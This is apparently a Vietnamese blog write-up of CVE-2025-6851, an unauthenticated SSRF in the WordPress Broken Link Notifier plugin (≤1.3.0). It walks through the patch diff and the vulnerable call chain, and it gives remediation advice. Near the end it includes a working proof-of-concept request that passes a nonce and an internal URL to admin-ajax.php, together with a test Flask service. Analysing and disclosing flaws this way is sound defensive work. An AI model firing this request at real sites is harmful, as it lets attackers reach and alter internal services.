# CVE-2025-6851 Analysis & POC


<!--more-->

## CVE & Basic Info
Plugin **Broken Link Notifier** cho WordPress bị lỗ hổng **Server‑Side Request Forgery** trong tất cả các phiên bản đến và bao gồm **1.3.0** thông qua hàm `ajax_blinks()` vốn cuối cùng gọi hàm `check_url_status_code()`. Điều này cho phép **attacker chưa xác thực (unauthenticated attackers)** thực hiện các yêu cầu web tới bất kỳ địa chỉ nào xuất phát từ ứng dụng web và có thể được dùng để truy vấn hoặc sửa đổi thông tin từ các dịch vụ nội bộ.

* **CVE ID**: [CVE-2025-6851](https://www.cve.org/CVERecord?id=CVE-2025-6851)
* **Vulnerability Type**: Server Side Request Forgery (SSRF)
* **Affected Versions**: <= 1.3.0
* **Patched Versions**: 1.3.1
* **CVSS severity**: Medium (7.2)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress Broken Link Notifier Plugin](https://wordpress.org/plugins/broken-link-notifier/)

## Requirements
* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/).
* **Plugin versions** - **Broken Link Notifier**: **1.3.0** (vulnerable) và **1.3.1** (patched).
* **Diff tool** - [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.

## Analysis

### Patch diff

```php {title="helpers.php - v1.3.0" hl_lines=[6,11,13]}
public function check_url_status_code( $url, $timeout = null ) {
    // Add the home url
    if ( str_starts_with( $url, '/' ) ) {
        $link = home_url().$url;
    } else {
        $link = $url;
    }
    ...

    // Check the link
    $response = wp_remote_get( $link, $http_request_args );
    if ( !is_wp_error( $response ) ) {
        $code = wp_remote_retrieve_response_code( $response );    
        $error = 'Unknown';
    } else {
        $code = 0;
        $error = $response->get_error_message();
    }
} // End check_url_status_code
```

Trong phiên bản lỗi, hàm `check_url_status_code()` thực hiện việc gọi `wp_remote_get()` trực tiếp với URL do người dùng cung cấp mà không hề kiểm tra tính hợp lệ hay mức độ an toàn của URL. Điều này tạo ra lỗ hổng **SSRF (Server-Side Request Forgery)**. Phiên bản này không kiểm tra scheme của URL, host có hợp lệ hay không, hay IP có thuộc dải private/reserved, nên mọi request đều được thực hiện mà không có hạn chế.

```php {title="helpers.php - v1.3.1" hl_lines=[6,9,10,11,12,16,18,26]}
public function check_url_status_code( $url, $timeout = null ) {
    // Add the home url
    if ( str_starts_with( $url, '/' ) ) {
        $link = home_url().$url;
    } else {
        $link = $url;
    }
    // Block SSRF to private/reserved ranges
    $unsafe = $this->is_url_unsafe( $link );
    if ( $unsafe ) {
        return apply_filters( 'blnotifier_status', $unsafe );
    }
    ...

    // Check the link
    $response = wp_remote_get( $link, $http_request_args );
    if ( !is_wp_error( $response ) ) {
        $code = wp_remote_retrieve_response_code( $response );    
        $error = 'Unknown';
    } else {
        $code = 0;
        $error = $response->get_error_message();
    }
} // End check_url_status_code

protected function is_url_unsafe( $url ) {
    $parts = wp_parse_url( $url );

    if ( ! isset( $parts[ 'scheme' ], $parts[ 'host' ] ) ) {
        return [
            'type' => 'broken',
            'code' => 0,
            'text' => 'Blocked: invalid or malformed URL',
            'link' => $url
        ];
    }

    $scheme = strtolower( $parts[ 'scheme' ] );
    if ( ! in_array( $scheme, [ 'http', 'https' ], true ) ) {
        return [
            'type' => 'broken',
            'code' => 0,
            'text' => 'Blocked: unsupported URL scheme',
            'link' => $url
        ];
    }

    $host = $parts[ 'host' ];
    $records = @dns_get_record( $host, DNS_A + DNS_AAAA );
    $ips = [];

    if ( is_array( $records ) && count( $records ) ) {
        foreach ( $records as $record ) {
            if ( isset( $record[ 'type' ] ) && $record[ 'type' ] === 'A' && ! empty( $record[ 'ip' ] ) ) {
                $ips[] = $record[ 'ip' ];
            }
            if ( isset( $record[ 'type' ] ) && $record[ 'type' ] === 'AAAA' && ! empty( $record[ 'ipv6' ] ) ) {
                $ips[] = $record[ 'ipv6' ];
            }
        }
    } else {
        $resolved = gethostbyname( $host );
        if ( $resolved && $resolved !== $host ) {
            $ips[] = $resolved;
        }
    }

    if ( empty( $ips ) ) {
        return [
            'type' => 'broken',
            'code' => 0,
            'text' => 'Blocked: host could not be resolved',
            'link' => $url
        ];
    }

    foreach ( $ips as $ip ) {
        if ( filter_var( $ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE ) === false ) {
            return [
                'type' => 'broken',
                'code' => 0,
                'text' => 'Blocked: resolved to internal or reserved IP address',
                'link' => $url
            ];
        }
    }

    return false; // Safe
} // End is_url_unsafe()
```

Bản vá đã bổ sung hàm `is_url_unsafe()`. Trước khi gọi `wp_remote_get()`, URL được kiểm tra chi tiết: chỉ cho phép scheme `http` và `https`, xác thực host hợp lệ, thực hiện resolve DNS để lấy IP và chặn tất cả các IP nội bộ hoặc thuộc dải reserved. Nếu URL không hợp lệ hoặc không an toàn, hàm sẽ trả về thông tin chi tiết về việc block và **không thực hiện request**, từ đó **ngăn chặn SSRF hiệu quả**. Bản vá đảm bảo rằng chỉ các URL an toàn mới được phép gọi, giảm thiểu rủi ro tấn công từ bên ngoài.

### Vulnerable Code 

```php {title="helpers.php - v1.3.0" hl_lines=[3,6,43,45,82,83,84,85,86,87,90]}
public function check_url_status_code( $url, $timeout = null ) {
    // Get the 'allow_redirects' option and sanitize it
    $allow_redirects = filter_var( get_option( 'blnotifier_allow_redirects' ), FILTER_VALIDATE_BOOLEAN );

    // Determine the request method based on allow_redirects option
    $request_method = $allow_redirects ? 'GET' : 'HEAD';

    // Force giving head for images, videos, and audio files
    if ( $request_method == 'GET' ) {
        $file_extension = strtolower( pathinfo( $url, PATHINFO_EXTENSION ) );
        if ( in_array( $file_extension, $this->get_force_head_file_types() ) ) {
            $request_method = 'HEAD';
        }
    }
    
    // User agent
    $user_agent = $this->get_user_agent( $url );

    // Add the home url
    if ( str_starts_with( $url, '/' ) ) {
        $link = home_url().$url;
    } else {
        $link = $url;
    }

    // Check if from youtube
    if ( $watch_url = $this->is_youtube_link( $link ) ) {
        $link = 'https://www.youtube.com/oembed?format=json&url='.$watch_url;
    }

    // The request args
    // See https://developer.wordpress.org/reference/classes/WP_Http/request/
    $http_request_args = apply_filters( 'blnotifier_http_request_args', [
        'method'      => $request_method,
        'timeout'     => $timeout,
        'redirection' => absint( get_option( 'blnotifier_max_redirects', 5 ) ),
        'httpversion' => '1.1',
        'sslverify'   => filter_var( get_option( 'blnotifier_ssl_verify', true ), FILTER_VALIDATE_BOOLEAN ),
        'user-agent'  => $user_agent
    ], $url );

    // Check the link
    $response = wp_remote_get( $link, $http_request_args );
    if ( !is_wp_error( $response ) ) {
        $code = wp_remote_retrieve_response_code( $response );    
        $error = 'Unknown';
    } else {
        $code = 0;
        $error = $response->get_error_message();
    }

    // Let's make invalid URL 0 codes broken
    if ( $code === 0 && ( $error == 'A valid URL was not provided.' || strpos( $error, 'cURL error 6: Could not resolve host' ) !== false ) ) {
        $code = 666;
    }

    // Possible Codes
    $codes = $this->get_status_codes();

    // Files too large
    if ( $request_method == 'GET' ) {
        $content_length = wp_remote_retrieve_header( $response, 'content-length' );
        if ( $content_length && $content_length > 10 * 1024 * 1024 ) { // 10 MB
            $code = 413;
        }
    }
    
    // Bad links
    if ( in_array( $code, $this->get_bad_status_codes() ) ) {
        $type = 'broken';

    // Warnings
    } elseif ( in_array( $code, $this->get_warning_status_codes() ) ) {
        $type = 'warning';

    // Good links
    } else {
        $type = 'good';
    }

    // Filter status
    $status = apply_filters( 'blnotifier_status', [
        'type' => $type,
        'code' => $code,
        'text' => ( $code !== 0 && ( isset( $codes[ $code ] ) && $codes[ $code ][ 'msg' ] != '' ) ) ? $codes[ $code ][ 'msg' ] : $error,
        'link' => $url
    ] );

    // Return the array
    return $status;
} // End check_url_status_code
```

Hàm `check_url_status_code()` có nhiệm vụ **kiểm tra trạng thái của một URL** và phân loại nó là **good (tốt), warning (cảnh báo) hoặc broken (hỏng)**. Cụ thể, hoạt động của hàm gồm các bước chính:

1. Lấy tùy chọn cấu hình
    * Lấy tùy chọn `blnotifier_allow_redirects` từ database và chuyển về boolean → Quyết định xem request sẽ dùng **GET** hay **HEAD**.

2. Chọn phương thức request
    * Nếu `allow_redirects = true`, mặc định dùng **GET**.
    * Nếu URL là **file media** (hình ảnh, video, audio), hàm sẽ ép dùng **HEAD** để tránh tải toàn bộ file lớn.

{{< admonition >}}
Tùy chọn này được thiết lập tại `http://localhost/wp-admin/admin.php?page=broken-link-notifier&tab=settings`
![Redirect Setting](redirect_setting.png "Allow Redirect settings")
{{< /admonition >}}

3. Xác định user-agent
    * Hàm gọi `$this->get_user_agent()` để lấy user-agent phù hợp cho request.

4. Chuẩn hóa URL
    * Nếu URL bắt đầu bằng `/` → nối với `home_url()` để thành URL tuyệt đối.
    * Nếu URL là **link YouTube**, chuyển sang endpoint `oembed` để lấy thông tin an toàn mà không cần truy cập trực tiếp video.

5. Cấu hình request:
Xây dựng mảng `$http_request_args` chứa các thông số cho request:
  * `method` (GET/HEAD)
  * `timeout`
  * `redirection` (số lần redirect tối đa)
  * `sslverify` (có kiểm tra SSL hay không)
  * `user-agent`

6. Thực hiện request
    * Gọi `wp_remote_get($link, $http_request_args)` để lấy response.
    * Nếu không lỗi → lấy **status code** từ server.
    * Nếu lỗi → lấy thông báo lỗi.

7. Xử lý các URL không hợp lệ
    * Một số lỗi cơ bản như không cung cấp URL hợp lệ hoặc không resolve được host → gán code đặc biệt `666`.

8. Xử lý file quá lớn
    * Nếu request GET và **content-length > 10MB**, gán code `413` (Payload Too Large).

9. Phân loại kết quả dựa trên code HTTP trả về:
  * `broken` → URL hỏng
  * `warning` → URL cảnh báo
  * `good` → URL hợp lệ

10. Trả về kết quả: Tạo mảng `$status` gồm:
  * `type` → loại URL (`good/warning/broken`)
  * `code` → mã HTTP hoặc code đặc biệt
  * `text` → thông báo (message hoặc lỗi)
  * `link` → URL gốc

* Cuối cùng trả về mảng này để plugin sử dụng hiển thị trạng thái URL.

{{< admonition bug >}}
Hàm này chỉ gửi request đến URL và trả về trạng thái của URL đó, không lấy hoặc trả về nội dung file. Vấn đề SSRF xuất hiện khi attacker cung cấp URL trỏ tới các dịch vụ nội bộ — server sẽ thực hiện request thay cho attacker, có thể gây ra các hành động như thay đổi dữ liệu, xóa dữ liệu, quét/kiểm tra cổng nội bộ hoặc gọi các endpoint nhạy cảm. Hàm không cho phép đọc trực tiếp nội dung file trả về, nhưng việc thực hiện request đến các internal service vẫn đủ để gây tổn hại.
{{< /admonition >}}

`check_url_status_code()` được gọi bên trong hàm `check_link()`

```php {title="helpers.php - v1.3.0" hl_lines=[6,9,13,29]}
public function check_link( $link ) {
    ...
    // Handle the filtered link if false
    if ( !$link ) {
    ...
    } elseif ( str_starts_with( $link, home_url() ) || ( str_starts_with( $link, '/' ) && !str_starts_with( $link, '//' ) ) ) {
        
        // Check locally first
        if ( !url_to_postid( $link ) ) {                

            // It may be redirected or an archive page, so let's check status anyway
            // return $this->check_url_status_code( $link );
            $status = $this->check_url_status_code( $link );
            $CACHE->set_cached_link( $status );
            return $status;
        }
    // Otherwise
    } else {
        // Skip url schemes
        foreach ( $this->get_url_schemes() as $scheme ) {
            if ( str_starts_with( $link, $scheme.':' ) ) {
                $status[ 'text' ] = 'Skipping: Non-Http URL Schema';
                return $status;
            }
        }

        // Return the status
        // return $this->check_url_status_code( $link );
        $status = $this->check_url_status_code( $link );
        $CACHE->set_cached_link( $status );
        return $status;
    }

    // Return the good status
    return $status;
} // End check_link()
```

Hàm `check_link()` kiểm tra URL trước khi gọi `check_url_status_code()`. Nếu link là nội bộ nhưng không trỏ tới post hợp lệ (`elseif`), hoặc là link ngoài site hợp lệ(`else`), hàm sẽ gọi `check_url_status_code()` để lấy trạng thái (`good`, `warning`, `broken`) và lưu cache. Link trống, không hợp lệ, hoặc có scheme không hỗ trợ sẽ bị bỏ qua mà không gửi request.

`check_link()` được gọi bên trong hàm `ajax_blinks()`

```php {title="results.php - v1.3.0" hl_lines=[3,8,9,14,17,22,26]}
public function ajax_blinks() {
    // Verify nonce
    if ( !isset( $_REQUEST[ 'nonce' ] ) || !wp_verify_nonce( sanitize_text_field( wp_unslash( $_REQUEST[ 'nonce' ] ) ), $this->nonce_blinks ) ) {
        exit( 'No naughty business please.' );
    }

    // Get the ID
    $source_url    = isset( $_REQUEST[ 'source_url' ] ) ? filter_var( wp_unslash( $_REQUEST[ 'source_url' ] ), FILTER_SANITIZE_URL ) : '';
    $header_links  = isset( $_REQUEST[ 'header_links' ] ) ? wp_unslash( $_REQUEST[ 'header_links' ] ) : []; // phpcs:ignore WordPress.Security.
    ...

    // Make sure we have a source URL
    if ( $source_url ) {

        // Only allow webpages, not file:///, etc.
        if ( !str_starts_with( $source_url, 'http' ) ) {
            wp_send_json_error( 'Invalid source: ' . $source_url );
        }

        // Header links
        if ( !empty( $header_links ) ) {
            foreach ( $header_links as &$header_link ) {
                $count_links++;
                $header_link = $HELPERS->sanitize_link( $header_link );
                $status = $HELPERS->check_link( $header_link );
                if ( in_array( $status[ 'code' ], $notify_status_codes ) ) {
                    $count_notify++;
                    $notify[ 'header' ][] = $status;
                } else {
                    $good_links[ 'header' ][] = $status;
                }
            }
        }
        ...
    } 
    ...
} // End ajax_blinks()
```
Hàm này được đăng ký làm callback cho action hook với hook name là `wp_ajax_nopriv_blnotifier_blinks` dành cho **anonymous user**

```php
private $ajax_key_blinks = 'blnotifier_blinks';
add_action( 'wp_ajax_nopriv_'.$this->ajax_key_blinks, [ $this, 'ajax_blinks' ] );
```

Sau đó thực hiện các chức năng sau:

1. Check `nonce` để chống CSRF

{{< admonition >}}
Vì hook này dành cho **anonymous user** nên `nonce` cũng sẽ xuất hiện trong mã nguồn trang chủ trả về.
![Nonce](nonce.png "Nonce trong mã nguồn trả về")
{{< /admonition >}}

2. Lấy dữ liệu từ request
    * Lấy `source_url` và các link từ `header_links`
    * Chỉ chấp nhận `source_url` bắt đầu bằng `http`.

3. Duyệt từng `header_links` link và gọi `check_link()` để kiểm tra trạng thái

`header_links` được truyền vào ở dạng mảng: `header_link[0]=http://example.com`

### Flow

{{< mermaid >}}
graph LR
    A[Anonymous Client gửi URL] --> B[ajax_blinks]
    B --> C[check_link]
    C --> D[check_url_status_code]
    D --> E[wp_remote_get với URL user cung cấp]
    E --> F[Response từ server]
{{< /mermaid >}}


## Exploit

### Local Server
Tạo local service đơn giản bằng python

```py
from flask import Flask, request
import os

BASE_DIR = os.path.abspath(os.getcwd())
app = Flask(__name__)

@app.route('/delete', methods=['GET'])
def delete():
    file_id = request.args.get('id')
    if not file_id:
        return "No id provided", 400
    print(f"delete it: {file_id}")
    return f"Delete it: {file_id}"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8001, debug=True)
```

### Proof of Concept (PoC)
1. Truy cập trang chủ và lấy `nonce`

2. Gửi POST request đến endpoint

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
...

action=blnotifier_blinks&nonce=87f4d1ef16&source_url=http://localhost:8001/&header_links[0]=http://127.0.0.1:8001/delete?id=1
```

**Result**:

![Result](result.png "Gửi thành công request tới local service")

## Conclusion

Phiên bản **≤1.3.0** của Broken Link Notifier có lỗ hổng **SSRF**: endpoint cho phép anonymous truyền URL, dẫn đến `wp_remote_get()` gọi tới dịch vụ nội bộ. Bản **1.3.1** đã thêm kiểm tra DNS/IP và giới hạn quyền, ngăn chặn SSRF trước khi thực hiện request.

## Key takeaways

* **Nâng cấp ngay** lên **≥1.3.1**.
* **Không tin URL từ client** — validate/allowlist trước khi fetch.
* **Chặn IP nội bộ** (resolve DNS, block private/reserved).
* **Giới hạn quyền** endpoint (không cho anonymous).
* **Trả status thay vì body thô** khi không cần nội dung.

## References

[SSRF (Server Side Request Forgery) — Hacktrick](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html)

[ WordPress Broken Link Notifier Plugin <= 1.3.0 is vulnerable to Server Side Request Forgery (SSRF) ](https://patchstack.com/database/wordpress/plugin/broken-link-notifier/vulnerability/wordpress-broken-link-notifier-plugin-1-3-0-unauthenticated-server-side-request-forgery-vulnerability) 

---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-10-28-cve-2025-6851/  

